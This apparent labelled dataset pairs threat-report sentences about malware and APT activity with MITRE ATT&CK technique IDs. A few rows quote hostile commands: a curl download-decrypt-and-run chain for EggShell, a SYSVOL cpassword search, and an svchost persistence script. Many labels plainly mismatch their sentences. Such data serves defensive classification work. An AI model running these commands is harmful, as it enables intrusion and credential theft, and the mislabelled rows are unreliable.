text1,labels
FIN7 gathers information on network shares.,['T1039']
FIN7 attacks can and inject code into processes and hijack the search order used to load DLL files.,['T1574.001']
"This example of BazarLoader generated command and control (C2) activity, retrieving BazarBackdoor using HTTPS traffic from 104.248.174[.]225 over TCP port 443.",['T1043']
"Use the latest attack patterns, Kubernetes (K8s) or Docker API targeting, which were featured in two reports focusing on TeamTNT operations, Black-T: New Cryptojacking Variant from TeamTNT and Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes.",['T1588.002']
"Once the executable file is executed, it will proceed to unzip a file named mdkhm.zip and then execute a Crimson RAT executable named dlrarhsiva.exe.",['T1588.001']
The spreadsheet??s macro code retrieved a malicious Dynamic Link Library (DLL) file for BazarLoader from the following URL,['T1204.001']
"In this case, a Cobalt Strike DLL file was sent through Bazar C2 traffic and saved to the infected Windows host under the user??s AppData\Roaming directory",['T1564.003']
"Cobalt Strike is an adversary simulation platform developed for penetration testers by Raphael Mudge, founder of Strategic Cyber LLC. Designed for interoperability with other platforms such as Metasploit, NMAP, and Powershell Empire, it can be run using Armitage, a graphic user interface (GUI) developed by Mudge, initially for Metasploit. Armitage and Cobalt Strike are designed around a team server that allows for the sharing of information and the ability to direct and execute well-coordinated actions.",['T1061']
"As days go by, more of the reported ransomware attacks turn out to be related to the new Pay2Key ransomware. The attacker followed the same procedure to gain a foothold, propagate and remotely control the infection within the compromised companies.",['T1189']
"SUGARDUMP using SMTP for C2 communication ?C dated to late 2021-early 2022. This variant was downloaded from a known UNC3890 C2 (URL: hxxp://128.199.6[.]246/3-Video-VLC.exe), and is a slightly more advanced version with similar credential harvesting functionality. ",['T1041']
"Trickbot is the most common malware distributed by Emotet, but it is not the only one. Qakbot is another type of malware frequently dropped on Emotet-infected Windows hosts.",['T1588.001']
"We can apply this same concept across other executable traits, such as BOOSTWRITE??s export DLL name (DWriteImpl.dll), to create quick and easy rules that can aid in quick discovery as seen in Figure 7.",['T1129']
"HenBox attempts to hide itself from the app launcher view by running the following code, passing the parameters COMPONENT_ENABLED_STATE_DISABLED (2) and DONT_KILL_APP (1) to the setComponentEnabledSetting() method.",['T1564']
"Skidmap, a Linux malware that we recently stumbled upon, demonstrates the increasing complexity of recent cryptocurrency-mining threats. This malware is notable because of the way it loads malicious kernel modules to keep its cryptocurrency mining operations under the radar.",['T1588.001']
"Although there are no previously known malicious Android applications attributed to the StrongPity group, we strongly believe that the threat actor is in the process of actively developing new malicious components that can be used to target Android platforms.",['T1505']
"In early April, Emotet acquired a module for distribution over wireless networks (MD5: 75d65cea0a33d11a2a74c703dbd2ad99), which tried to access Wi-Fi using a dictionary attack. Its code resembled that of the Network Spreader module (bypass.exe), which had been supplemented with Wi-Fi connection capability. If the brute-force was successful, the module transmitted data about the network to C&C.",['T1588.001']
"With the amount of overlap between the other components in these separate campaigns, we decided to compare the Pirpi payloads delivered by the UPS group using CVE-2014-1776 and CVE-2015-3113. From here on, we will refer to these two payloads as Pirpi.2014 (CVE-2014-1776) and Pirpi.2015 (CVE-2015-3113), whose details are listed in Table 1. Unit 42 discovered several similarities between the two Pirpi variants, as well as a few equally important differences, both of which are worth discussing. We also compared the Pirpi.2014 and Pirpi.2015 payloads to other known Pirpi samples in an attempt to determine which variant they most closely resemble.",['T1588.006']
"Another infamous banker Trojan, Kronos, caught up with Edge in 2016. We checked out its capabilities on a Windows 10 virtual machine. In the code of the new Kronos version we found a function that checks the name and checksum of a process, as well as the hashes of the functions hooked by the malware.",['T1056.004']
"The success of the Dropping Elephant group is striking given that no zero-day exploits or advanced techniques were used to target high-profile victims ?C it??s clear that by applying security updates and improving the security awareness of staff, the success of attacks like this can be prevented. At the start of the year we predicted that APT groups would invest less effort in developing sophisticated tools and make greater use of off-the-shelf malware. Dropping Elephant provides a further example of how low investment and use of ready-made toolsets can be very effective when combined with high quality social engineering.",['T1587.001']
"In early 2015, a new Emotet modification was released, not all that different from the previous one. Among the changes were: new built-in public RSA key, most strings encrypted, ATS scripts for web injection cleared of comments, targets included clients of Swiss banks.",['T1592.004']
"A C&C address (103.82.52[.]18) which was found in one of MosaicRegressor??s variants (MD5:3B58E122D9E17121416B146DAAB4DB9D) was observed in use by the ??Winnti umbrella and linked groups??, according to a publicly available report. Since this is the only link between our findings and any of the groups using the Winnti backdoor, we estimate with low confidence that it is indeed responsible for the attacks.",['T1587.001']
"Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file. The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at ??%temp%\Save.tmp??. The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain:",['T1554']
". . MuddyWater has conducted various campaigns against entities spread throughout the U.S.A, Europe, Middle East and South Asia.. . A typical TTP employed by the group is the heavy use of scripting in their infection chains using languages like PowerShell and Visual Basic coupled with the frequent use of living-of-the-land binaries (LoLBins).. . Cisco Talos recently observed a campaign operated by MuddyWater targeting users in Turkey. This campaign consists of the use of malicious PDFs and Microsoft Office documents (maldocs) to serve as the initial infection vector. These maldocs were named in such a way as to masquerade as legitimate documents from the Turkish Health and Interior Ministries.. . Next, the malware executes a series of scripts deployed on the infected endpoint to serve as downloaders and instrumentors for additional payloads.. . We've also discovered the use of flags or tokens in attacks conducted by this threat actor in this campaign. These tokens are meant to signal a successful infection of a target by the group's malicious artifacts.. . . . ",['T1203']
"In recent years, malware delivery mechanisms have changed from fixed media (diskettes) to email (e.g. the infamous LoveLetter email worm) and direct network attacks (e.g. CodeRed). The most recent step in the evolution process is a move to delivering malware via the world wide web.",['T1102']
"We determined the string in the pre tags is the actor provided password, which the webshell uses as a key to decrypt the embedded payload. We determined this by following the process in which the TwoFace++ loader webshell uses the actor provided password to authenticate and decrypt the embedded webshell:",['T1552.004']
Vidar can also receive settings from the C&C that tells it exactly what to do.,['T1588.001']
QAKBOT can use VBS to download and execute malicious files,['T1588.001']
"The observed attack technique (OAT) detection indicates that the php-cgi process represents a ??/bin/bash?? shell??and is directly reading ??passwd??, suggesting that the server might have been compromised",['T1059.004']
Uses BITSAdmin to download and install payloads.,['T1588.002']
"Sideloading happens after the steps described earlier ?? the threat actor successfully exploited Log4j and downloaded mfeann.exe, LockDown.DLL, and c0000012.log.",['T1203']
Ducktail has now replaced the older NET Core information-stealing malware used in previous campaigns with one written in PHP.,['T1587.001']
"Deletes some of its files used during operations as part of cleanup, including removing applications such as 7z.exe, tor.exe, ssh.exe",['T1070.004']
"In rare cases, LockBit 2.0 has been observed to create accounts for persistence with simple names, such as ??a.??",['T1136.001']
"In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector. The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne,?? .",['T1588.001']
Androrat is an open source remote management tool developed by a team of four for a university project. Open source code was upload to the GitHub website in 2012. It is a remote management tool that allows remote control of mobile devices using a computer.,['T1588.001']
"In the initial phases, the Sunburst malware talks to the C&C server by sending encoded DNS requests. These requests contain information about the infected computer; if the attackers deem it interesting enough, the DNS response includes a CNAME record pointing to a second level C&C server.",['T1583.002']
"A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",['T1041']
. The attackers have also used file names and export API names in the CRAT DLLs to masquerade the RAT as a benign application's library. Some examples of the exported function names are:. ,['T1140']
"Samples associated with either RedAlpha campaign remain quite rare, with less than 20 samples identified across the two campaigns. Custom samples are coded in C++. The 2018 dropper relied on a rare C++ cross-platform framework called Haxe to string together pieces of publicly available source code largely found in Chinese-language forums and blogs.",['T1587.001']
"The sample was first uploaded to VT on the 2018-10-12 from the Ukraine. It exhibits an encoding and a code style that are similar to those used by former series of Hades droppers. Nevertheless, it introduces new features like anti-analysis and delayed execution, which were only used by the second stage payload in the past.",['T1587.001']
"This resembled the server-side ASPX payload of the China Chopper webshell documented previously. Uploads to VirusTotal in late August 2018 resembling the same filename, iisstart.aspx, indicate the deployed webshell was likely a version of the China Chopper webshell known to have been used by several Chinese threat actors.",['T1588.001']
"If we look historically, BelialDemon has been involved in the development of malware loaders. BelialDemon is considered the primary developer of TriumphLoader, a loader previously posted about on several forums, and has experience with selling this type of malware.",['T1588.001']
"In 2014, a European corporation was compromised prior to constructing a manufacturing facility in Vietnam.. In 2016, Vietnamese and foreign-owned corporations working in network security, technology infrastructure, banking, and media industries were targeted.?. In mid-2016, malware that FireEye believes to be unique to APT32 was detected on the networks of a global hospitality industry developer with plans to expand operations into Vietnam.. From 2016 through 2017, two subsidiaries of U.S. and Philippine consumer products corporations, located inside Vietnam, were the target of APT32 intrusion operations.",['T1587.001']
"SPLM, otherwise known as CHOPSTICK, or by the author(s) as ??XAgent??, is described as Sofacy??s signature second stage tool, selectively used for years against around the world. Really, many modified XAgent modules have been deployed over the years. Even the individual Linux modules renamed as ??Fysbis?? backdoors released in 2016 were merely modified and reduced portions of recompiled XAgent C/C++ codebase. Anyway, SPLM/CHOPSTICK has maintained various combinations of code, with some recognizable functionality listed here.",['T1587.001']
The first versions of these new USB stealer modules appeared around February 2015 and the latest appear to have been compiled in May 2015. Older versions of these USBSTEALER modules were previously described by our colleagues from ESET.,['T1587.001']
"SpyNote is similar to Droidjack and is also a commercial RAT. It is powerful and provides convenient management tools.. At present, the price of different versions on the official websited is $499 and $4000 respectively.",['T1588.001']
". . Once the second stage is extracted and run, we are presented with the final stage of this attack, which we refer to as ComboJack. Once ComboJack is extracted it begins by copying itself to the following location:",['T1587.001']
"In order to ??steal?? cryptocurrency from a victim, WeSteal uses regular expressions to look for strings matching the patterns of Bitcoin and Ethereum wallet identifiers being copied to the clipboard. When it matches these, it replaces the copied wallet ID in the clipboard with one supplied by the malware. The victim then pastes the substituted wallet ID for a transaction, and the funds are sent instead to the substitute wallet.",['T1115']
"Spora ransomware, which began circulating in January of this year, is a ransomware noted for its sophistication, including top-notch customer support to victims, and was likely created by professional malicious actors.",['T1588.001']
"Earlier in the year, as part of an incident response investigation, we uncovered a new version of the Skimer ATM malware. The malware, which first surfaced in 2009, has been re-designed. So too have the tactics of the cybercriminals using it. The new ATM infector has been targeting ATMs around the world, including the UAE, France, the United States, Russia, Macau, China, the Philippines, Spain, Germany, Georgia, Poland, Brazil and the Czech Republic.",['T1587.001']
"The 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant. The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections. It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality.",['T1587.001']
"Elknot, also known as BillGates, a very long live and active ddos botnet which targeted Linux systems and was later ported to the Windows platform[4]??. . Now we see Elknot setting its foot on both platforms for this vulnerability, and sharing the same C2 .",['T1584.005']
"GandCrab 2 is far from a merely repackaged GandCrab 1. It contains fixes for several flaws in the original, including one critical encryption flaw that would have trivially allowed a universal decryptor (more on this below).",['T1587.001']
"The main loader and privilege escalation tool, ??autorun.exe?? fires up a special dropper, which is actually an Equation Group DoubleFantasy implant installer. The installer is stored as ??show.dll?? in the ??Presentation?? folder of the CDROM.",['T1068']
"Unlike the original geacon, Blackrota uses gobfuscate to obfuscate the. source code before compiling. gobfuscate is an open-source tool for Go code. obfuscation, which can obfuscate the following elements of Go source code. with random character substitutions:",['T1001']
"As the Top Twenty shows, DNSChanger is also widespread. There is actually a connection between Zlob and DNSChanger ?C we believe they were created by the same gang. Although DNSChanger underwent many changes during its lifespan, basically what it does is simply change the DNS servers from the user??s computer to a set of two specific IP addresses. The IP addresses are selected from a huge pool and the variation comes in distributing thousand of different DNSChanger binaries, each one setting the DNS servers to distinct IP addresses. While changing the DNS servers may not be regarded as something seriously malicious, an attacker who achieves this can actually do a lot of harm ?C for instance, redirecting websites such as Amazon.com or Bank Of America to phishing installations almost entirely without any sign of warning to the user. To complicate removal, the most recent DNSChangers include rootkit components and even download additional malware.",['T1014']
"The group??s arsenal at that point included multiple Trojans and tools for Windows and macOS. In 2015, the actors started to expand their espionage efforts from PCs to mobile devices using the spyware called MobileOrder, which focused on compromising Android devices. Based on the code similarity, shared infrastructure and victimology, we conclude that the new wave of attacks belongs to the same threat actor and that the group continues to deploy and develop MobileOrder malware until this day. In addition to clear code overlaps, we observed multiple overlaps in the infrastructure between the new samples and the old MobileOrder malware variant, as well as multiple variants of Windows Psylo Trojan previously attributed to Scarlet Mimic, that interact with the same malicious domains as the mobile malware.",['T1587.001']
"In 2018 Intezer covered Foudre version 8, which contained a certain sample labeled unknown binary that was not explored in Intezer??s research. In fact, this was a new component ?? called Tonnerre ?? which was a new step in the evolution of Infy, and contained various functionality absent from Foudre alone.",['T1587.001']
The executable dispci.exe appears to be derived from the code base of the legitimate utility DiskCryptor. It acts as the disk encryption module which also installs the modified bootloader and prevents the normal boot-up process of the infected machine.,['T1561.002']
"After the botnets of direct ZeuS successors were taken down, Dridex??s time came. This malware is a result of Bugat evolution (which appeared in 2010). Bugat v5 was recognized as Dridex in 2014.",['T1587.001']
"The injected wermgr.exe process then creates a new folder in the user??s AppData directory. As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).?",['T1055']
A sample of the data that is encrypted and sent to the CnC server for version ??p=2?? is seen in the memory dump shown in Figure 6. At offset 4-7 it contains a time-based counter. It uses the keyword "osamu" in this instance to identify this particular campaign. The campaign keywords are not sent out in version ??p=1?? but can still be found hardcoded in the DLL payload. The hostname and OS information are also included in the beacon. It awaits further commands from the CnC server in response to the data sent out.,['T1082']
"The dropper extracts the communications and wiper components from resources named ??PKCS7?? and ??PKCS12?? respectively, while the x86 sample extracts the x64 variant of Disttrack from a resource named ??X509??. To extract the components, the dropper is configured to seek specific offsets within the resource, read a specified number of bytes and decrypt the contents using a specified key. The key exists in the sample as a base64 encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource. When determining the location of the ciphertext within the resource, the dropper subtracts 14 from the offset value in the sample??s configuration as an additional layer of obfuscation. Table 1 shows the resources within the Disttrack x86 sample, the component it contains and the values needed to decrypt its contents.",['T1132']
"BokBot achieves malicious payload execution by abusing a renamed copy of the legitimate WMIC utility, which will execute a XSL script file. The entire process is outlined below.",['T1220']
"A modified EternalBlue exploit, also used by WannaCry.. The EternalRomance exploit ?C a remote code execution exploit targeting Windows XP to Windows 2008 systems over TCP port 445 (Note: patched with MS17-010).. An attack against the update mechanism of a third-party Ukrainian software product called MeDoc.",['T1203']
"The SLUB backdoor is a custom one written in the C++ programming language, statically linking curl library to perform multiple HTTP requests. Other statically-linked libraries are boost (for extracting commands from gist snippets) and JsonCpp (for parsing slack channel communication).",['T1587.001']
Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified. The following example Python code shows how this encryption takes place:,['T1573']
"The Russian-speaking APT group Turla (known variously as ??Snake??, ??Uroburos??, ??Venomous Bear?? and ??KRYPTON??) has been active since at least 2007 (and maybe even longer). Its activities have been traced to many high-profile incidents, including the 2008 attack against the US Central Command (the Buckshot Yankee incident) and, more recently, the attack against the Swiss military contractor, RUAG. We??ve discuss its activities on a number of occasions (here, here, here and here). The group intensified its activities in 2014, targeting Ukraine, EU-related institutions, governments of EU countries, global foreign affairs ministries, media companies and possibly corruption-related targets in Russia. In 2015 and 2016 the group diversified its activities, switching from the Epic Turla watering-hole framework to the Gloog Turla framework, which is still active. The group also expanded its spear-phishing activities with the Skipper/WhiteAtlas attacks, which made use of new malware. Recently, the group has intensified its satellite-based C2 registrations ten-fold compared to the 2015 average.",['T1587.001']
"BONDUPDATER waits to receive an instruction from the C2 server that starts with ??E?? before writing the downloaded data to the supplied filename. After receiving the ??E?? instruction, the Trojan will write the base64 decoded data to the file and process the newly created file. Figure 27 shows the C2 server providing the ??E?? instruction within the TXT answer. In the current example, the Trojan would treat the newly saved file as a script thanks to the filename ending with the ??0?? character. The Trojan would run the contents of the file using ??cmd.exe?? and save the output to a file named ??proc10100?? that will be uploaded to the C2 server.",['T1059.003']
"When the news broke in 2014 about a new sophisticated threat actor dubbed the Turla Group, which the Estonian foreign intelligence service believes has Russian origins and operates on behalf of the FSB, its kernelmode malware also became the first publicly-described case that abused a third-party device driver to disable Driver Signature Enforcement (DSE). This security mechanism was introduced in Windows Vista to prevent unsigned drivers from loading into kernel space. Turla exploited the signed VirtualBox driver, VBoxDrv.sys v1.6.2, to deactivate DSE and load its unsigned payload drivers afterward.",['T1211']
"Interestingly, the ChChes samples we observed were digitally signed using a certificate originally used by HackingTeam and later part of the data leaked when they were themselves hacked. Wapack labs also observed a similar sample targeting Japan in November. It??s not clear why the attackers chose to use this certificate, as it was old, had been leaked online, and had already been revoked by the time they used it. Digital certificates are typically used because they afford an air of legitimacy, which this one definitely does not.",['T1596.003']
"The authors of Black Lambert included a couple of very interesting details in the sample, which read as the following: toolType=wl, build=132914, versionName = 2.0.0. Looking for similar samples, we were able to identify another generation of related tools which we called White Lambert. While Black Lambert connects directly to its C&C for instructions, White Lambert is a fully passive, network-driven backdoor.",['T1587.001']
"In Figure 4, the first DNS query to resolve is. . yFIOr645245444143544544.windows64x[.]com which acts as an initial beacon. The first five characters (yFIOr) are random and have no purpose other than generating random subdomains in order to avoid DNS caching. The next two characters (64) signify the Hex notation of the d request type, which is the request type for the initial beacon as noted in Table 3. The request type is followed by the system specific hostname hardcoded into the sample, which in this case is 5245444143544544 for <REDACTED>.",['T1583.002']
"As soon as the proof-of-concept (PoC) for CVE-2020-9054 was made publicly available last month, this vulnerability was promptly abused to infect vulnerable versions of Zyxel network-attached storage (NAS) devices with a new Mirai variant ?C Mukashi.",['T1588.006']
"The Wekby group continues to target various high profile organizations using sophisticated malware. The pisloader malware family uses various novel techniques, such as using DNS as a C2 protocol, as well as making use of return-oriented programming and other anti-analysis tactics.",['T1583.002']
"In total Unit 42 has seen over 50 versions of these weaponized documents spanning from late October through to March. We??ve used these to lay out a timeline, which will be referenced throughout the remainder of this blog, of the milestones of evolution that provides some insight into why the changes are made. Note: This figure does not cover all versions seen but simply milestone changes. It does however start with the first version created on October 23rd, last saved 25th October and first seen by our Wildfire cloud sandbox 26th October.",['T1587.001']
"This update to Emissary allowed the Trojan to run as a service. The configuration now contains settings for the Emissary service, which the Trojan will store in and access from the following registry keys:",['T1574.011']
". . The bot will report key information back to the C&C, including the result of the various custom API executions. The first communications include any hard-coded C&C followed by the DGA. Shifu uses RC4 encryption in the network communications. Notably, the key for the samples analyzed by iSIGHT Partners is actually the default RC4 key included with the Crypto library, further suggesting this malware is under development. The following is the key observed:",['T1587.001']
"For this method, Ransom Cartel uses a tool named """"DonPAPI,"""" which can search hosts for DPAPI blobs containing Wi-Fi keys, RDP passwords, and credentials saved in web browsers and then download and decrypt them locally on the machine.",['T1587.001']
It reads and executes commands from a text file stored in Mega cloud storage,['T1530']
These credentials are then used to compromise Linux ESXi servers and authenticate to their vCenter web interfaces.,['T1199']
CreepyUp: uploads any file to the C&C server.,['T1105']
"The browser extension serves as adware and an infostealer, leaking all of the user??s search engine queries. We discovered significant changes and additions of capabilities throughout this campaign's evolution, and we predict further changes as this campaign continues.",['T1217']
"Most of the fake lures for this campaign are related to games, subtitle files, adult videos, and cracked MS Office applications. These are hosted in ZIP format on legitimate file hosting services.",['T1189']
The implanted VBS file is capable of reporting information about infected machines and downloading additional payloads with an encoded format,['T1059.005']
"Identity theft via hijacking user-profiles and stealing their cryptocurrency, or using popular accounts to spread malware and/or scams",['T1083']
"During the extraction, a JSP webshell is deployed on one of the public directories used by the webmail component. The attacker can browse to the webshell to start executing arbitrary commands on the victim machine.",['T1059']
Obscure secure messaging client as delivery vehicle for malware and cloak for malicious activity,['T1573']
Uses encoded PowerShell commands.,['T1027']
"For C&C communication, POLONIUM abuses common cloud services such as Dropbox, OneDrive, and Mega.",['T1136.003']
The only known method of delivering stolen information to cybercriminals is by sending a ZIP archive to an embedded control center.,['T1102']
The ransomware payload is copied to an Active Directory Domain Controller and deployed to systems using the Default Domain Group Policy Object,['T1570']
"TechnoCreep is a previously undocumented C# backdoor that communicates with a C&C server via TCP sockets. In this case, commands are not read from a file, but received in an exchange of messages",['T1071']
"It is able to steal autofill information from web browsers, cookies, saved credit cards, browser history, coin wallets and Telegram databases. ",['T1185']
"LockBit 2.0 enumerates system information such as hostname, shares, and domain information.",['T1082']
MEGASync is the leading way for LockBit 2.0 affiliates to exfiltrate data from clients with it being occasionally replaced by RClone.,['T1041']
"The NewsBeef APT previously engaged in long-term, elaborate social engineering schemes that take advantage of popular social network platforms. Previous analysis of the NewsBeef APT indicates that the group focuses on Saudi Arabian (SA) and Western targets, and lacks advanced offensive technology development capabilities.",['T1593.001']
Russian state-sponsored APT actors have used previously compromised account credentials to attempt to access Group Managed Service Account (gMSA) passwords.,['T1555']
BlackMatter may wipe backup systems.,['T1561']
BlackMatter uses EnumServicesStatusExW to enumerate running services on the network.,['T1007']
BlackMatter leverages LDAP and SMB protocol to discover all hosts in the AD.,['T1018']
"BlackMatter leverages legitimate remote monitoring and management software and remote desktop software, often by setting up trial accounts, to maintain persistence on victim networks.",['T1133']
Chinese state-sponsored cyber actors have been observed executing malware shellcode and batch files to establish new services to enable persistence,['T1543.003']
Chinese state-sponsored cyber actors were observed using the 7- Zip utility to unzip imported tools and malware files onto the victim device.,['T1140']
Chinese state-sponsored cyber actors were observed using benign executables which used DLL loadorder hijacking to activate the malware installation process.,['T1564']
Chinese state-sponsored cyber actors have been observed exploiting Pulse Secure VPN appliances to view and extract valid user credentials and network information from the servers.,['T1212']
Chinese state-sponsored cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities.,['T1083']
Chinese state-sponsored cyber actors have been observed using Nbtscan and nmap to scan and enumerate target network information.,['T1046']
"Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC). The actor may then perform actions as the logged-on user. Chinese state-sponsored cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.",['T1210']
"Chinese state-sponsored cyber actors used compression and encryption of exfiltration files into RAR archives, and subsequently utilizing cloud storage services for storage.",['T1560']
Chinese state-sponsored cyber actors have been observed using the New-MailboxExportRequest PowerShell cmdlet to export target email boxes.,['T1114']
Chinese state-sponsored cyber actors have been observed: ? Using commercial cloud storage services for command and control. ? Using malware implants that use the Dropbox API for C2 and a downloader that downloads and executes a payload using the Microsoft OneDrive API.,['T1071']
Chinese state-sponsored cyber actors have been observed using a non-standard SSH port to establish covert communication channels with VPS infrastructure.,['T1571']
"The actors used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144 to gain privileged remote code execution on vulnerable Microsoft Exchange servers. In some cases, this exploitation occurred after valid credentials were identified by password spray, as these vulnerabilities require authentication as a valid user.",['T1190']
The actors used a compromised Office 365 service account with Global Administrator privileges to collect email from user inboxes.,['T1078.002']
"The actors operate a Kubernetes cluster, which allows them to conduct distributed and large-scale targeting using password spray and password guessing",['T1110.003']
The actors downloaded archives of collected data previously staged on a target's OWA server via HTTPS.,['T1048.002']
"SVR leveraged access gained from the SolarWinds campaign to compromise a certificate issued by Mimecast, which it then used to authenticate a subset of Mimecast's products with customer systems.",['T1199']
The execution of the malicious PuTTY binary resulted in the deployment of a backdoor to the host. The deployed backdoor is an evolution of the malware family Mandiant tracks as AIRDRY.,['T1218']
"In the PuTTY sample discovered on VirusTotal, the malicious code was inserted into the ssh2_userauth_process_queue function (source file: putty-0.77\ssh\userauth2-client.c). The code resides in the part of the function responsible for performing password authentication, as opposed to other methods such as public key or keyboard-interactive authentication. Once the user establishes a connection and enters their username and password, the malicious code is executed regardless of the authentication result.",['T1480']
"In the PuTTY sample discovered on VirusTotal, the malicious code was inserted into the ssh2_userauth_process_queue function (source file: putty-0.77\ssh\userauth2-client.c). The code resides in the part of the function responsible for performing password authentication, as opposed to other methods such as keyboard-interactive authentication or public key. Once the user establishes a connection and enters their username and password, the malicious code is executed regardless of the authentication result.",['T1480']
"Commands passed as arguments into e.py were also seen being executed by the targeted Windows guest machine, running as a child process under vmtoolsd.exe. This execution chain can be seen in Figure 5. The parent binary /bin/rdt was not present on disk but was able to be recovered by dumping the processes memory of the ESXi hypervisor. The python script that sent out commands to the guest machines, e.py, was unable to be recovered.",['T1202']
"Actors used the netstat command to display TCP connections, prevent hostname determination of foreign IP addresses, and specify the protocol for TCP.",['T1049']
"Compiled HTML File (CHM) are commonly Microsoft help files. These file will be a compiled HTML files that includes documents , image , scripts etc. Hackers will abuse these files to embed malicious payload with CHM files. CHM files can be executed by HH.exe , which is a Microsoft windows utility. Adversaries use this techniques to evade AV or application blacklisting techniques.",['T1218']
"If an attacker has domain admin permissions, he can steal the DC backup key and as a result, decrypt all the domain users?? master keys. The Mimikatz module allowing to extract the domain backup key is lsadump::backupkeys. This module first calls the API functions LsaOpenPolicy with POLICY_GET_PRIVATE_INFORMATION as the DesiredAccess argument, so it will be able to call the function LsaRetrievePrivateData after-",['T1207']
Nefilim uses the following  ??timeout?? command to delay the execution of the ??del?? command. Adversaries use this command also to evade sandbox analysis. C:\Windows\System32\cmd.exe" /c timeout /t 3 /nobreak",['T1497.003']
"The Nefilim ransomware uses IsDebuggerPresent, CheckRemoteDebuggerPresent, and NtQueryInformationProcess API functions to check if a user-mode debugger is running. Debuggers are used by security analysts to inspect malware??s behavior at the run-time. In the presence of a debugger,  malware samples exhibited less malicious behavior. Moreover, Nefilim uses the NtSetInformationThread API function to evade debugging.",['T1518.001']
"The Nefilim ransomware downloads the Psexec.exe tool, and it also abuses the Windows built-in WMI (Windows Management Instrumentation) utility for lateral movement. PsExec is a free Microsoft tool that can be used to execute commands and binaries on remote systems and download or upload a file over a network share. Nefilim uses PsExec and WMI with hard-coded admin credentials to remotely execute the batch files and the ransomware file in remote hosts.",['T1570']
Mandiant assesses with moderate confidence that the threat actor obtained the session token from the operators of the info-stealer malware. These tokens were used by the actor via public VPN providers to authenticate to the target??s Microsoft 365 environment.,['T1550.004']
"In a particular campaign, Mandiant identified that the threat actor performed initial reconnaissance via a VPS provider located in the same region as the victim. Mandiant believes a misconfiguration by the threat actor meant that the VPN services running on the VPS stopped functioning after 8 hours.",['T1583.003']
APT41 used a malware variant called WIDETONE to conduct port scans on the specified subnets.,['T1046']
DCRat will also drop a .bat file containing a script that runs the W32tm ??stripchart?? command on the compromised host. This command is used as a delay tactic for its execution and beaconing.,['T1124']
The following analytic detects a powershell script that enumerates the camera mounted to the targeted host.,['T1592.001']
We detect the attachment file as W97M/Adnel or MHT/Dloader. This macro malware is usually attached in the spam emails as .doc files. It uses social engineering tricks to be able to run the malicious macro script that is disabled by default in Microsoft Office.,['T1586.001']
"APT32 is widely known to use such social engineering techniques to trick a user into enabling macros, after which a file downloads multiple malicious payloads from remote servers.",['T1586.001']
APT29 was the hunting for passwords stored in SYSVOL. This technique relies on passwords that are stored as part of Group Policy Preferences. Passwords stored in this way are encrypted using a known scheme that can easily be decrypted. APT29 GPP password datamining C:\WINDOWS\system32\cmd.exe /C findstr /S /I cpassword \\DOMAIN\sysvol\DOMAIN\policies\*.xml,['T1003.008']
"The app executes the following shell command to download a custom-compiled version of the EggShell server for macOS: nohup curl -k -L -o /tmp/.info.enc https://github.com/youarenick/newProject/raw/master/info.enc; openssl enc -aes-256-cbc -d -in /tmp/.info.enc -out /tmp/.info.py -k 111111qq; python /tmp/.info.py The first part of the command downloads an encoded file from a Github page belonging to a user named youarenick"" and saves that file to a hidden file named .info.enc in /private/tmp/. Next, it uses openssl to decode that file into a hidden Python file named .info.py. Finally, it executes the resulting Python script.""",['T1553.001']
"To summarize, the Mach-O does the following: Downloads a file from the URL supplied as an argument Decrypts this file using AES-128-EBC and TEA with a custom delta Writes the resulting file to $TMPDIR/airportpaird and makes it executable Uses the privilege escalation exploit to remove the com.apple.quarantineattribute from the file to avoid asking the user to confirm the launch of the unsigned executable",['T1553.001']
copy %~dp0%DLL_NAME%" "%WORK_DIR%" /Y reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "%SERVICE_NAME%" /t REG_MULTI_SZ /d "%SERVICE_NAME%" /f sc create "%SERVICE_NAME%" binPath= "%SystemRoot%\system32\svchost.exe -k %SERVICE_NAME%" type= share start= auto error= ignore DisplayName= "%DISPLAY_NAME%" SC failure "%SERVICE_NAME%" reset= 86400 actions=",['T1055']
"In one instance, FIN13 deployed a backdoor called MAILSLOT, which communicates over SMTP/POP over SSL, sending and receiving emails to and from a configured attacker-controlled email account for its command and control. MAILSLOT makes FIN13 a rare case of a threat actor who has used email communications for C2.",['T1102.003']
"In this intrusion from December 2021, the threat actors utilized IcedID as the initial access vector. IcedID is a banking trojan that first appeared in 2017, usually, it is delivered via malspam campaigns and has been widely used as an initial access vector in multiple ransomware intrusions. Upon execution of?? .",['T1219']
CVE-2015-1197 is a directory traversal vulnerability: extracting specially crafted archives containing symbolic links can cause files to be placed at an arbitrary location in the file system.,['T1083']
"Five minutes after the automated reconnaissance activities are completed, the QAKBOT-injected wermgr.exe process drops the Brute Ratel DLL and invokes it via a rundll32.exe child process with the ??main?? export function.",['T1218.011']
"Unit 42 has been tracking an APT campaign we name TiltedTemple, which we first identified in connection with its use of the Zoho ManageEngine ADSelfService Plus vulnerability CVE-2021-40539 and ServiceDesk Plus vulnerability CVE-2021-44077.",['T1588.006']
"Vidar is an info-stealer. It downloads DLL files freebl3.dll, mozglue.dll, msvcp140.dll, nss3.dll, softokn3.dll and vcruntime140.dll from its C&C for use in password-grabbing routines.",['T1588.001']
